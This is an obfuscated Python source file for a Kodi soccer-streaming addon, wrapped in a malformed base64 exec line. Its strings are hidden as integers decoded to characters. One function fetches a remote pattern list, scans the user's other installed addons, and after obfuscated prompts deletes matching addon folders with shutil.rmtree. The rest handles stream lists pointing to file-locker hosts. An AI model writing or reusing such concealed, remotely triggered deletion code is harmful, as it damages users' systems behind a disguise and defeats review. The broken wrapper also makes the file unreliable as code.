import base64;exec base64.b64decode('import urllib
import urllib2
import datetime
import re
import os
import xbmcplugin
import xbmcgui
import xbmcaddon
import xbmcvfs
import traceback
import cookielib
import shutil
from addon . common . net import Net
from BeautifulSoup import BeautifulStoneSoup , BeautifulSoup , BeautifulSOAP
from xbmc import translatePath as translate
try :
 import json
except :
 import simplejson as json
import SimpleDownloader as downloader
import time
import requests
if 64 - 64: i11iIiiIii
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
o0OO00 = Net ( user_agent = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.72 Safari/537.36' )
oo = {
 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
 }
if 27 - 27: oO0OooOoO * o0Oo
i1IiI1I11 = [ '180upload.com' , 'allmyvideos.net' , 'bestreams.net' , 'clicknupload.com' , 'cloudzilla.to' , 'movshare.net' , 'novamov.com' , 'nowvideo.sx' , 'videoweed.es' , 'daclips.in' , 'datemule.com' , 'fastvideo.in' , 'faststream.in' , 'filehoot.com' , 'filenuke.com' , 'sharesix.com' , 'docs.google.com' , 'plus.google.com' , 'picasaweb.google.com' , 'gorillavid.com' , 'gorillavid.in' , 'grifthost.com' , 'hugefiles.net' , 'ipithos.to' , 'ishared.eu' , 'kingfiles.net' , 'mail.ru' , 'my.mail.ru' , 'videoapi.my.mail.ru' , 'mightyupload.com' , 'mooshare.biz' , 'movdivx.com' , 'movpod.net' , 'movpod.in' , 'movreel.com' , 'mrfile.me' , 'nosvideo.com' , 'openload.io' , 'played.to' , 'bitshare.com' , 'filefactory.com' , 'k2s.cc' , 'oboom.com' , 'rapidgator.net' , 'uploaded.net' , 'primeshare.tv' , 'bitshare.com' , 'filefactory.com' , 'k2s.cc' , 'oboom.com' , 'rapidgator.net' , 'uploaded.net' , 'sharerepo.com' , 'stagevu.com' , 'streamcloud.eu' , 'streamin.to' , 'thefile.me' , 'thevideo.me' , 'tusfiles.net' , 'uploadc.com' , 'zalaa.com' , 'uploadrocket.net' , 'uptobox.com' , 'v-vids.com' , 'veehd.com' , 'vidbull.com' , 'videomega.tv' , 'vidplay.net' , 'vidspot.net' , 'vidto.me' , 'vidzi.tv' , 'vimeo.com' , 'vk.com' , 'vodlocker.com' , 'xfileload.com' , 'xvidstage.com' , 'zettahost.tv' ]
IIiIiII11i = [ 'plugin.video.dramasonline' , 'plugin.video.f4mTester' , 'plugin.video.shahidmbcnet' , 'plugin.video.SportsDevil' , 'plugin.stream.vaughnlive.tv' , 'plugin.video.ZemTV-shani' ]
if 51 - 51: oOo0O0Ooo * I1ii11iIi11i
if 48 - 48: oO0o / OOooOOo / I11i / Ii1I
class IiiIII111iI ( urllib2 . HTTPErrorProcessor ) :
 def http_response ( self , request , response ) :
  return response
 https_response = http_response
 if 34 - 34: iii1I1I / O00oOoOoO0o0O . O0oo0OO0 + Oo0ooO0oo0oO . I1i1iI1i - II
 if 100 - 100: i11Ii11I1Ii1i . II - iIii1I11I1II1 . I11i . Ii1I / O00oOoOoO0o0O
 if 21 - 21: oO0o / Oo0ooO0oo0oO * I1ii11iIi11i . oO0OooOoO
Ii1IIii11 = xbmcaddon . Addon ( 'plugin.video.NJMSoccer' )
Oooo0000 = Ii1IIii11 . getAddonInfo ( 'version' )
i11 = xbmc . translatePath ( Ii1IIii11 . getAddonInfo ( 'profile' ) . decode ( 'utf-8' ) )
I11 = xbmc . translatePath ( Ii1IIii11 . getAddonInfo ( 'path' ) . decode ( 'utf-8' ) )
Oo0o0000o0o0 = os . path . join ( i11 , 'favorites' )
oOo0oooo00o = os . path . join ( i11 , 'history' )
oO0o0o0ooO0oO = chr
oo0o0O00 = os . path . join ( i11 , 'list_revision' )
oO = os . path . join ( I11 , 'icon.png' )
i1iiIIiiI111 = os . path . join ( I11 , 'fanart.jpg' )
oooOOOOO = os . path . join ( i11 , 'source_file' )
i1iiIII111ii = i11
if 3 - 3: Oo0ooO0oo0oO + O0
downloader = downloader . SimpleDownloader ( )
I1Ii = Ii1IIii11 . getSetting ( 'debug' )
if os . path . exists ( Oo0o0000o0o0 ) == True :
 o0oOo0Ooo0O = open ( Oo0o0000o0o0 ) . read ( )
else : o0oOo0Ooo0O = [ ]
if os . path . exists ( oooOOOOO ) == True :
 OO00O0O0O00Oo = open ( oooOOOOO ) . read ( )
else : OO00O0O0O00Oo = [ ]
if 25 - 25: OOooOOo % oO0OooOoO - oO0OooOoO . oO0OooOoO
if 32 - 32: i1IIi . O00oOoOoO0o0O % I1ii11iIi11i . OOooOOo
if 42 - 42: II + I11i
def OOoO000O0OO ( text ) :
 try :
  import xbmc , xbmcgui , xbmcaddon , xbmcvfs
  if 23 - 23: i11iIiiIii + o0Oo
  if 68 - 68: oO0o . Ii1I . i11iIiiIii
  IIiI = 'NJM Soccer'
  if 22 - 22: oOo0O0Ooo % O0oo0OO0
  id = 10147
  if 84 - 84: i11iIiiIii . OOooOOo
  xbmc . executebuiltin ( 'ActivateWindow(%d)' % id )
  xbmc . sleep ( 100 )
  if 100 - 100: O0oo0OO0 - O0oo0OO0 - II
  ii1 = xbmcgui . Window ( id )
  if 57 - 57: O0oo0OO0 % OoooooooOO
  if 61 - 61: Oo0ooO0oo0oO . iIii1I11I1II1 * o0Oo . i11Ii11I1Ii1i % oOo0O0Ooo
  if 72 - 72: iii1I1I
  o0Oo00OOOOO = 50
  while ( o0Oo00OOOOO > 0 ) :
   try :
    xbmc . sleep ( 10 )
    ii1 . getControl ( 1 ) . setLabel ( IIiI )
    ii1 . getControl ( 5 ) . setText ( text )
    o0Oo00OOOOO = 0
   except :
    o0Oo00OOOOO -= 1
    if 85 - 85: i11Ii11I1Ii1i . Oo0ooO0oo0oO - I1ii11iIi11i % i11Ii11I1Ii1i % oO0OooOoO
  return id
 except :
  return id
  if 81 - 81: I1ii11iIi11i + oO0OooOoO % Oo0ooO0oo0oO * O0
  if 89 - 89: Ii1I + oOo0O0Ooo
  if 3 - 3: i1IIi / o0Oo % O00oOoOoO0o0O * i11iIiiIii / O0 * O00oOoOoO0o0O
def III1ii1iII ( string ) :
#    if debug == 'true':
 if I1Ii == 'false' :
  xbmc . log ( "[addon.live.NJMSoccerr3-%s]: %s" % ( Oooo0000 , string ) )
  if 54 - 54: o0Oo % oO0OooOoO % oO0OooOoO
  if 13 - 13: OOooOOo . O0oo0OO0
def i11Iiii ( i1Ii11i11 ) :
 if i1Ii11i11 :
  return oO0o0o0ooO0oO ( i1Ii11i11 % 256 ) + i11Iiii ( i1Ii11i11 // 256 )
 else :
  return ""
  if 23 - 23: OOooOOo . oO0OooOoO
def Oo0O0OOOoo ( headers , ilIi11i11 = None ) :
 if 95 - 95: I1ii11iIi11i % Ii1I . O0
 if 15 - 15: i11Ii11I1Ii1i / O0oo0OO0 . O0oo0OO0 - i1IIi
 try :
  if ilIi11i11 is None :
   ilIi11i11 = { i11Iiii ( 549830960776755148059477 ) : i11Iiii ( 115871497219915 ) }
  o00oOO0 = urllib2 . Request ( headers , None , ilIi11i11 )
  oOoo = urllib2 . urlopen ( o00oOO0 )
  iIii11I = oOoo . read ( )
  oOoo . close ( )
  return iIii11I
 except urllib2 . URLError , OOO0OOO00oo :
  III1ii1iII ( 'URL: ' )
  if hasattr ( OOO0OOO00oo , 'code' ) :
   III1ii1iII ( 'We failed with error code - %s.' % OOO0OOO00oo . code )
   xbmc . executebuiltin ( "XBMC.Notification(NJMSoccer,We failed with error code - " + str ( OOO0OOO00oo . code ) + ",10000," + oO + ")" )
  elif hasattr ( OOO0OOO00oo , 'reason' ) :
   III1ii1iII ( 'We failed to reach a server.' )
   III1ii1iII ( 'Reason: %s' % OOO0OOO00oo . reason )
   xbmc . executebuiltin ( "XBMC.Notification(NJMSoccer,We failed to reach a server. - " + str ( OOO0OOO00oo . reason ) + ",10000," + oO + ")" )
   if 31 - 31: oO0OooOoO - iii1I1I . II % oO0o - O0
   if 4 - 4: oO0OooOoO / i11Ii11I1Ii1i . Oo0ooO0oo0oO
   if 58 - 58: iii1I1I * i11iIiiIii / oO0o % II - I11i / Ii1I
def ii11i1 ( var1 ) :
 if 29 - 29: I11i % o0Oo + i11Ii11I1Ii1i / OOooOOo + iii1I1I * OOooOOo
 xbmcgui . Dialog ( ) . ok ( 'NJMSoccer' , var1 )
 if 42 - 42: O0oo0OO0 + Ii1I
 if 76 - 76: II - I1ii11iIi11i
def oOooOOo00Oo0O ( ) :
 if 72 - 72: Oo0ooO0oo0oO / i1IIi * oOo0O0Ooo - II
 if 51 - 51: oO0OooOoO * I1ii11iIi11i % OOooOOo * oO0OooOoO % I11i / i11Ii11I1Ii1i
 iIIIIii1 ( 'Search' , 'Search' , 40 , 'http://s5.postimg.org/caapig1rb/search.jpg' , i1iiIIiiI111 , '' , '' , '' , '' )
 if 58 - 58: i11iIiiIii % O00oOoOoO0o0O
 if 71 - 71: iii1I1I + i11Ii11I1Ii1i % i11iIiiIii + I11i - I1i1iI1i
 iIii11I = Oo0O0OOOoo ( i11Iiii ( 273535982406624293676496065084371233995264867076727655689835162124403852126033360593587210618244247360481031272 ) )
 if 88 - 88: oO0o - I1ii11iIi11i % iii1I1I
 iI1I111Ii111i = translate ( i11Iiii ( 168703161405947505919113829509027576656811432177779 ) )
 if 7 - 7: i11Ii11I1Ii1i * I1ii11iIi11i % Ii1I . I1i1iI1i
 try :
  iIii11I . replace ( '\n' , '' ) . replace ( '\r' , '' )
  Ii1iIiII1ii1 = i11Iiii ( 11692103616308220793909810985109194826849 )
  if 62 - 62: iIii1I11I1II1 * oO0o
  i1 = re . compile ( Ii1iIiII1ii1 ) . findall ( iIii11I )
  if 91 - 91: I1ii11iIi11i . I11i + I1ii11iIi11i - Oo0ooO0oo0oO / OoooooooOO
  for iII1 in i1 :
   if 30 - 30: oO0OooOoO - iii1I1I - i11iIiiIii % oO0o - oO0OooOoO * O0oo0OO0
   for oO00O0O0O , i1ii1iiI , O0o0O00Oo0o0 in os . walk ( iI1I111Ii111i , topdown = True ) :
    if 87 - 87: i11Ii11I1Ii1i * oOo0O0Ooo % i11iIiiIii % oO0o - iii1I1I
    for O0ooo0O0oo0 in i1ii1iiI :
     if 91 - 91: iIii1I11I1II1 + II
     try :
      i1i = xbmc . translatePath ( os . path . join ( iI1I111Ii111i , O0ooo0O0oo0 , i11Iiii ( 2000136465759821128801 ) ) ) ;
      if 46 - 46: II % O00oOoOoO0o0O + I1ii11iIi11i . oO0o . I1ii11iIi11i
      with open ( i1i , 'r' ) as oO00o0 :
       OOoo0O = oO00o0 . read ( )
       if 67 - 67: i11iIiiIii - i1IIi % I11i . O0
      if iII1 in OOoo0O :
       if 77 - 77: I1i1iI1i / o0Oo
       ii11i1 ( i11Iiii ( 192619329663160018244198367353919975426446113357699308480575357170129072449068814423124733353389616061079601004208895625755745268652504127572017581266924455086465579475681565239960919 ) )
       if 15 - 15: I1i1iI1i . iIii1I11I1II1 . OoooooooOO / i11iIiiIii - O0oo0OO0 . i1IIi
       ii11i1 ( i11Iiii ( 1479683896746197762444572807055627206569571039960976250895027050881182821774317889501944902888566521283652328524876900636183425800070109373135241388429960777 ) + iII1 )
       if 33 - 33: O00oOoOoO0o0O . OOooOOo
       ii11i1 ( i11Iiii ( 40579205755990980728068332776662586529357632555689010365577962724472611480421618203071074269391359080990291435517882575017397913962612811888454542794604681651265 ) )
       if 75 - 75: OOooOOo % OOooOOo . II
       if xbmcgui . Dialog ( ) . yesno ( i11Iiii ( 2110234616753204054606 ) , i11Iiii ( 6666469741671290970692392949883905893227712383066335525892262555221 ) , "" , "" , i11Iiii ( 1953068369 ) , i11Iiii ( 2000058011228591189589 ) ) :
        if 5 - 5: OOooOOo * i11Ii11I1Ii1i + oO0o . iii1I1I + oO0o
        shutil . rmtree ( os . path . join ( oO00O0O0O , O0ooo0O0oo0 ) )
        if 91 - 91: O0
       else :
        if 61 - 61: oO0OooOoO
        return ( )
        if 64 - 64: i11Ii11I1Ii1i / oO0o - O0 - O00oOoOoO0o0O
     except :
      if 86 - 86: O00oOoOoO0o0O % oO0o / o0Oo / oO0o
      pass
 except :
  pass
  if 42 - 42: I1ii11iIi11i
  if 67 - 67: II . Oo0ooO0oo0oO . O0
  if 10 - 10: I11i % I11i - iIii1I11I1II1 / iii1I1I + O0oo0OO0
 OOOOoOoo0O0O0 ( i11Iiii ( 994714340412856489883906287969938244074742359277553502940616317810379224292376765200236164153004863752795240 ) , '' )
 if 85 - 85: Ii1I % i11iIiiIii - Oo0ooO0oo0oO * OoooooooOO / o0Oo % o0Oo
 if 1 - 1: I1ii11iIi11i - Ii1I . O00oOoOoO0o0O . I1ii11iIi11i / oOo0O0Ooo + O00oOoOoO0o0O
 xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) )
 if 78 - 78: O0 . Ii1I . oO0OooOoO % iii1I1I
 if 49 - 49: O0oo0OO0 / I1ii11iIi11i . oO0OooOoO
 if 68 - 68: i11iIiiIii % I11i + i11iIiiIii
def iii ( ) :
 if os . path . exists ( Oo0o0000o0o0 ) == True :
  iIIIIii1 ( 'Favorites' , 'url' , 4 , os . path . join ( I11 , 'resources' , 'favorite.png' ) , i1iiIIiiI111 , '' , '' , '' , '' )
 if Ii1IIii11 . getSetting ( "browse_xml_database" ) == "true" :
  iIIIIii1 ( 'XML Database' , 'http://xbmcplus.xb.funpic.de/www-data/filesystem/' , 15 , oO , i1iiIIiiI111 , '' , '' , '' , '' )
 if Ii1IIii11 . getSetting ( "browse_community" ) == "true" :
  iIIIIii1 ( 'Community Files' , 'community_files' , 16 , oO , i1iiIIiiI111 , '' , '' , '' , '' )
 if os . path . exists ( oOo0oooo00o ) == True :
  iIIIIii1 ( 'Search History' , 'history' , 25 , os . path . join ( I11 , 'resources' , 'favorite.png' ) , i1iiIIiiI111 , '' , '' , '' , '' )
 if Ii1IIii11 . getSetting ( "searchyt" ) == "true" :
  iIIIIii1 ( 'Search:Youtube' , 'youtube' , 25 , oO , i1iiIIiiI111 , '' , '' , '' , '' )
 if Ii1IIii11 . getSetting ( "searchDM" ) == "true" :
  iIIIIii1 ( 'Search:dailymotion' , 'dmotion' , 25 , oO , i1iiIIiiI111 , '' , '' , '' , '' )
 if Ii1IIii11 . getSetting ( "PulsarM" ) == "true" :
  iIIIIii1 ( 'Pulsar:IMDB' , 'IMDBidplay' , 27 , oO , i1iiIIiiI111 , '' , '' , '' , '' )
 if os . path . exists ( oooOOOOO ) == True :
  II1I = json . loads ( open ( oooOOOOO , "r" ) . read ( ) )
  if len ( II1I ) > 1 :
   for O0i1II1Iiii1I11 in II1I :
    if 9 - 9: I11i / oOo0O0Ooo - o0Oo / OoooooooOO / iIii1I11I1II1 - OOooOOo
    if isinstance ( O0i1II1Iiii1I11 , list ) :
     iIIIIii1 ( O0i1II1Iiii1I11 [ 0 ] . encode ( 'utf-8' ) , O0i1II1Iiii1I11 [ 1 ] . encode ( 'utf-8' ) , 1 , oO , i1iiIIiiI111 , '' , '' , '' , '' , 'source' )
    else :
     o00oooO0Oo = oO
     o0O0OOO0Ooo = i1iiIIiiI111
     iiIiI = ''
     I1 = ''
     credits = ''
     OOO00O0O = ''
     if O0i1II1Iiii1I11 . has_key ( 'thumbnail' ) :
      o00oooO0Oo = O0i1II1Iiii1I11 [ 'thumbnail' ]
     if O0i1II1Iiii1I11 . has_key ( 'fanart' ) :
      o0O0OOO0Ooo = O0i1II1Iiii1I11 [ 'fanart' ]
     if O0i1II1Iiii1I11 . has_key ( 'description' ) :
      iiIiI = O0i1II1Iiii1I11 [ 'description' ]
     if O0i1II1Iiii1I11 . has_key ( 'date' ) :
      I1 = O0i1II1Iiii1I11 [ 'date' ]
     if O0i1II1Iiii1I11 . has_key ( 'genre' ) :
      OOO00O0O = O0i1II1Iiii1I11 [ 'genre' ]
     if O0i1II1Iiii1I11 . has_key ( 'credits' ) :
      credits = O0i1II1Iiii1I11 [ 'credits' ]
     iIIIIii1 ( O0i1II1Iiii1I11 [ 'title' ] . encode ( 'utf-8' ) , O0i1II1Iiii1I11 [ 'url' ] . encode ( 'utf-8' ) , 1 , o00oooO0Oo , o0O0OOO0Ooo , iiIiI , OOO00O0O , I1 , credits , 'source' )
     if 33 - 33: O0 . I1i1iI1i . o0Oo
  else :
   if len ( II1I ) == 1 :
    if isinstance ( II1I [ 0 ] , list ) :
     OOOOoOoo0O0O0 ( II1I [ 0 ] [ 1 ] . encode ( 'utf-8' ) , i1iiIIiiI111 )
    else :
     OOOOoOoo0O0O0 ( II1I [ 0 ] [ 'url' ] , II1I [ 0 ] [ 'fanart' ] )
     if 72 - 72: i1IIi / I1ii11iIi11i + OoooooooOO - oOo0O0Ooo
     if 29 - 29: I11i + Ii1I % O0
def I1I11 ( url = None ) :
 if url is None :
  if not Ii1IIii11 . getSetting ( "new_file_source" ) == "" :
   II1 = Ii1IIii11 . getSetting ( 'new_file_source' ) . decode ( 'utf-8' )
  elif not Ii1IIii11 . getSetting ( "new_url_source" ) == "" :
   II1 = Ii1IIii11 . getSetting ( 'new_url_source' ) . decode ( 'utf-8' )
 else :
  II1 = url
 if II1 == '' or II1 is None :
  return
 III1ii1iII ( 'Adding New Source: ' + II1 . encode ( 'utf-8' ) )
 if 70 - 70: II - oOo0O0Ooo / O0oo0OO0
 O00OOOOOoo0 = None
 iIii11I = ii1I1iI1iIi111i ( II1 )
 if isinstance ( iIii11I , BeautifulSOAP ) :
  if iIii11I . find ( 'channels_info' ) :
   O00OOOOOoo0 = iIii11I . channels_info
  elif iIii11I . find ( 'items_info' ) :
   O00OOOOOoo0 = iIii11I . items_info
 if O00OOOOOoo0 :
  iiIi1IIi1I = { }
  iiIi1IIi1I [ 'url' ] = II1
  try : iiIi1IIi1I [ 'title' ] = O00OOOOOoo0 . title . string
  except : pass
  try : iiIi1IIi1I [ 'thumbnail' ] = O00OOOOOoo0 . thumbnail . string
  except : pass
  try : iiIi1IIi1I [ 'fanart' ] = O00OOOOOoo0 . fanart . string
  except : pass
  try : iiIi1IIi1I [ 'genre' ] = O00OOOOOoo0 . genre . string
  except : pass
  try : iiIi1IIi1I [ 'description' ] = O00OOOOOoo0 . description . string
  except : pass
  try : iiIi1IIi1I [ 'date' ] = O00OOOOOoo0 . date . string
  except : pass
  try : iiIi1IIi1I [ 'credits' ] = O00OOOOOoo0 . credits . string
  except : pass
 else :
  if '/' in II1 :
   o0OoOO000ooO0 = II1 . split ( '/' ) [ - 1 ] . split ( '.' ) [ 0 ]
  if '\\' in II1 :
   o0OoOO000ooO0 = II1 . split ( '\\' ) [ - 1 ] . split ( '.' ) [ 0 ]
  if '%' in o0OoOO000ooO0 :
   o0OoOO000ooO0 = urllib . unquote_plus ( o0OoOO000ooO0 )
  o0o0o0oO0oOO = xbmc . Keyboard ( o0OoOO000ooO0 , 'Displayed Name, Rename?' )
  o0o0o0oO0oOO . doModal ( )
  if ( o0o0o0oO0oOO . isConfirmed ( ) == False ) :
   return
  ii1Ii11I = o0o0o0oO0oOO . getText ( )
  if len ( ii1Ii11I ) == 0 :
   return
  iiIi1IIi1I = { }
  iiIi1IIi1I [ 'title' ] = ii1Ii11I
  iiIi1IIi1I [ 'url' ] = II1
  iiIi1IIi1I [ 'fanart' ] = o0O0OOO0Ooo
  if 80 - 80: oO0OooOoO
 if os . path . exists ( oooOOOOO ) == False :
  O0O = [ ]
  O0O . append ( iiIi1IIi1I )
  i1I1I = open ( oooOOOOO , "w" )
  i1I1I . write ( json . dumps ( O0O ) )
  i1I1I . close ( )
 else :
  II1I = json . loads ( open ( oooOOOOO , "r" ) . read ( ) )
  II1I . append ( iiIi1IIi1I )
  i1I1I = open ( oooOOOOO , "w" )
  i1I1I . write ( json . dumps ( II1I ) )
  i1I1I . close ( )
 Ii1IIii11 . setSetting ( 'new_url_source' , "" )
 Ii1IIii11 . setSetting ( 'new_file_source' , "" )
 xbmc . executebuiltin ( "XBMC.Notification(NJMSoccer,New source added.,5000," + oO + ")" )
 if not url is None :
  if 'xbmcplus.xb.funpic.de' in url :
   xbmc . executebuiltin ( "XBMC.Container.Update(%s?mode=14,replace)" % sys . argv [ 0 ] )
  elif 'community-links' in url :
   xbmc . executebuiltin ( "XBMC.Container.Update(%s?mode=10,replace)" % sys . argv [ 0 ] )
 else : Ii1IIii11 . openSettings ( )
 if 12 - 12: i11iIiiIii / I1ii11iIi11i
 if 80 - 80: II . i11iIiiIii - OOooOOo
def iIiIIi1 ( name ) :
 II1I = json . loads ( open ( oooOOOOO , "r" ) . read ( ) )
 for I1IIII1i in range ( len ( II1I ) ) :
  if isinstance ( II1I [ I1IIII1i ] , list ) :
   if II1I [ I1IIII1i ] [ 0 ] == name :
    del II1I [ I1IIII1i ]
    i1I1I = open ( oooOOOOO , "w" )
    i1I1I . write ( json . dumps ( II1I ) )
    i1I1I . close ( )
    break
  else :
   if II1I [ I1IIII1i ] [ 'title' ] == name :
    del II1I [ I1IIII1i ]
    i1I1I = open ( oooOOOOO , "w" )
    i1I1I . write ( json . dumps ( II1I ) )
    i1I1I . close ( )
    break
 xbmc . executebuiltin ( "XBMC.Container.Refresh" )
 if 2 - 2: O00oOoOoO0o0O + O0oo0OO0 - o0Oo % OOooOOo . Oo0ooO0oo0oO
 if 18 - 18: iii1I1I + Oo0ooO0oo0oO - O0oo0OO0 . oO0OooOoO + i11iIiiIii
 if 20 - 20: II
def Oo0oO00o ( url , browse = False ) :
 if url is None :
  url = 'http://xbmcplus.xb.funpic.de/www-data/filesystem/'
 i11I1II1I11i = BeautifulSoup ( Oo0O0OOOoo ( url ) , convertEntities = BeautifulSoup . HTML_ENTITIES )
 for O0i1II1Iiii1I11 in i11I1II1I11i ( 'a' ) :
  OooOoOO0 = O0i1II1Iiii1I11 [ 'href' ]
  if not OooOoOO0 . startswith ( '?' ) :
   iI1i11iII111 = O0i1II1Iiii1I11 . string
   if iI1i11iII111 not in [ 'Parent Directory' , 'recycle_bin/' ] :
    if OooOoOO0 . endswith ( '/' ) :
     if browse :
      iIIIIii1 ( iI1i11iII111 , url + OooOoOO0 , 15 , oO , o0O0OOO0Ooo , '' , '' , '' )
     else :
      iIIIIii1 ( iI1i11iII111 , url + OooOoOO0 , 14 , oO , o0O0OOO0Ooo , '' , '' , '' )
    elif OooOoOO0 . endswith ( '.xml' ) :
     if browse :
      iIIIIii1 ( iI1i11iII111 , url + OooOoOO0 , 1 , oO , o0O0OOO0Ooo , '' , '' , '' , '' , 'download' )
     else :
      if os . path . exists ( oooOOOOO ) == True :
       if iI1i11iII111 in OO00O0O0O00Oo :
        iIIIIii1 ( iI1i11iII111 + ' (in use)' , url + OooOoOO0 , 11 , oO , o0O0OOO0Ooo , '' , '' , '' , '' , 'download' )
       else :
        iIIIIii1 ( iI1i11iII111 , url + OooOoOO0 , 11 , oO , o0O0OOO0Ooo , '' , '' , '' , '' , 'download' )
      else :
       iIIIIii1 ( iI1i11iII111 , url + OooOoOO0 , 11 , oO , o0O0OOO0Ooo , '' , '' , '' , '' , 'download' )
       if 15 - 15: i11iIiiIii % O0oo0OO0 . oOo0O0Ooo + I11i
       if 61 - 61: oOo0O0Ooo * I11i % oOo0O0Ooo - i1IIi - iIii1I11I1II1
def oOooO0 ( browse = False ) :
 Ii1I1Ii = 'http://community-links.googlecode.com/svn/trunk/'
 i11I1II1I11i = BeautifulSoup ( Oo0O0OOOoo ( Ii1I1Ii ) , convertEntities = BeautifulSoup . HTML_ENTITIES )
 O0o0O00Oo0o0 = i11I1II1I11i ( 'ul' ) [ 0 ] ( 'li' ) [ 1 : ]
 for O0i1II1Iiii1I11 in O0o0O00Oo0o0 :
  iI1i11iII111 = O0i1II1Iiii1I11 ( 'a' ) [ 0 ] [ 'href' ]
  if browse :
   iIIIIii1 ( iI1i11iII111 , Ii1I1Ii + iI1i11iII111 , 1 , oO , o0O0OOO0Ooo , '' , '' , '' , '' , 'download' )
  else :
   iIIIIii1 ( iI1i11iII111 , Ii1I1Ii + iI1i11iII111 , 11 , oO , o0O0OOO0Ooo , '' , '' , '' , '' , 'download' )
   if 69 - 69: o0Oo / OOooOOo . I1i1iI1i * II % O0oo0OO0 - OOooOOo
   if 13 - 13: O0oo0OO0 . i11iIiiIii
def ii1I1iI1iIi111i ( url , data = None ) :
 if url . startswith ( 'http://' ) or url . startswith ( 'https://' ) :
  data = Oo0O0OOOoo ( url )
  if 56 - 56: I11i % O0 - o0Oo
  if 100 - 100: O0oo0OO0 - O0 % Ii1I * iii1I1I + o0Oo
  if 88 - 88: OoooooooOO - I1ii11iIi11i * O0 * OoooooooOO . OoooooooOO
  if re . search ( "#EXTM3U" , data ) or 'm3u' in url :
   return data
   if 33 - 33: II + Oo0ooO0oo0oO * Ii1I / iIii1I11I1II1 - o0Oo
 elif data == None :
  if xbmcvfs . exists ( url ) :
   if url . startswith ( "smb://" ) or url . startswith ( "nfs://" ) :
    O0oO = xbmcvfs . copy ( url , os . path . join ( i11 , 'temp' , 'sorce_temp.txt' ) )
    if O0oO :
     data = open ( os . path . join ( i11 , 'temp' , 'sorce_temp.txt' ) , "r" ) . read ( )
     xbmcvfs . delete ( os . path . join ( i11 , 'temp' , 'sorce_temp.txt' ) )
    else :
     III1ii1iII ( "failed to copy from smb:" )
   else :
    data = open ( url , 'r' ) . read ( )
    if re . match ( "#EXTM3U" , data ) or 'm3u' in url :
     return data
  else :
   III1ii1iII ( "Soup Data not found!" )
   return
 return BeautifulSOAP ( data , convertEntities = BeautifulStoneSoup . XML_ENTITIES )
 if 73 - 73: I11i * i11iIiiIii % Ii1I . I11i
 if 66 - 66: Ii1I + Ii1I + i11Ii11I1Ii1i / Oo0ooO0oo0oO + iii1I1I
 if 30 - 30: O0
 if 44 - 44: Ii1I / O00oOoOoO0o0O / O00oOoOoO0o0O
def OOOOoOoo0O0O0 ( url , fanart ) :
 OOO = "List"
 if 32 - 32: i1IIi / oO0OooOoO . oOo0O0Ooo
 i11I1II1I11i = ii1I1iI1iIi111i ( url )
 if isinstance ( i11I1II1I11i , BeautifulSOAP ) :
  if len ( i11I1II1I11i ( 'layoutype' ) ) > 0 :
   OOO = "Thumbnail"
   if 62 - 62: OoooooooOO * o0Oo
  if len ( i11I1II1I11i ( 'channels' ) ) > 0 :
   if 58 - 58: oO0o % OOooOOo
   if 50 - 50: II . OOooOOo
   ooO0OO = i11I1II1I11i ( 'channel' )
   for O000OOO in ooO0OO :
    if 20 - 20: OOooOOo . oO0OooOoO % iii1I1I * iIii1I11I1II1
    oO00oOOoooO = ''
    IiIi11iI = 0
    try :
     oO00oOOoooO = O000OOO ( 'externallink' ) [ 0 ] . string
     IiIi11iI = len ( O000OOO ( 'externallink' ) )
    except : pass
    if 83 - 83: oO0OooOoO % oOo0O0Ooo % i11Ii11I1Ii1i % I11i
    if IiIi11iI > 1 : oO00oOOoooO = ''
    if 80 - 80: i11iIiiIii % i11Ii11I1Ii1i + O0oo0OO0 % O00oOoOoO0o0O - I11i
    if 18 - 18: Oo0ooO0oo0oO - iii1I1I . II . iIii1I11I1II1
    if 2 - 2: iii1I1I . I1ii11iIi11i
    iI1i11iII111 = O000OOO ( 'name' ) [ 0 ] . string
    O0ooooOOoo0O = O000OOO ( 'thumbnail' ) [ 0 ] . string
    if O0ooooOOoo0O == None :
     O0ooooOOoo0O = ''
     if 36 - 36: Ii1I % Ii1I % i1IIi / i1IIi - i11Ii11I1Ii1i
    try :
     if not O000OOO ( 'fanart' ) :
      if Ii1IIii11 . getSetting ( 'use_thumb' ) == "true" :
       i1iI = O0ooooOOoo0O
      else :
       i1iI = fanart
     else :
      i1iI = O000OOO ( 'fanart' ) [ 0 ] . string
     if i1iI == None :
      raise
    except :
     i1iI = fanart
     if 94 - 94: iIii1I11I1II1 / oOo0O0Ooo % Oo0ooO0oo0oO * Oo0ooO0oo0oO * oO0OooOoO
    try :
     iiIiI = O000OOO ( 'info' ) [ 0 ] . string
     if iiIiI == None :
      raise
    except :
     iiIiI = ''
     if 29 - 29: I1ii11iIi11i + oO0o / OOooOOo / iii1I1I * iIii1I11I1II1
    try :
     OOO00O0O = O000OOO ( 'genre' ) [ 0 ] . string
     if OOO00O0O == None :
      raise
    except :
     OOO00O0O = ''
     if 62 - 62: iii1I1I / Ii1I - I1ii11iIi11i . O00oOoOoO0o0O
    try :
     I1 = O000OOO ( 'date' ) [ 0 ] . string
     if I1 == None :
      raise
    except :
     I1 = ''
     if 11 - 11: I11i . I1ii11iIi11i * I1i1iI1i * OoooooooOO + i11Ii11I1Ii1i
    try :
     credits = O000OOO ( 'credits' ) [ 0 ] . string
     if credits == None :
      raise
    except :
     credits = ''
     if 33 - 33: O0 * OOooOOo - II % II
    try :
     if oO00oOOoooO == '' :
      iIIIIii1 ( iI1i11iII111 . encode ( 'utf-8' , 'ignore' ) , url . encode ( 'utf-8' ) , 2 , O0ooooOOoo0O , i1iI , iiIiI , OOO00O0O , I1 , credits , True )
     else :
      if 18 - 18: II / oOo0O0Ooo * II + II * i11iIiiIii * I11i
      iIIIIii1 ( iI1i11iII111 . encode ( 'utf-8' ) , oO00oOOoooO . encode ( 'utf-8' ) , 1 , O0ooooOOoo0O , i1iI , iiIiI , OOO00O0O , I1 , None , 'source' )
    except :
     III1ii1iII ( 'There was a problem adding directory from getData(): ' + iI1i11iII111 . encode ( 'utf-8' , 'ignore' ) )
  else :
   III1ii1iII ( 'No Channels: getItems' )
   I1II1 ( i11I1II1I11i ( 'item' ) , fanart )
 else :
  oooO ( i11I1II1I11i )
  if 26 - 26: O0oo0OO0 % I11i
 if OOO == "Thumbnail" :
  o00Oo0oooooo ( )
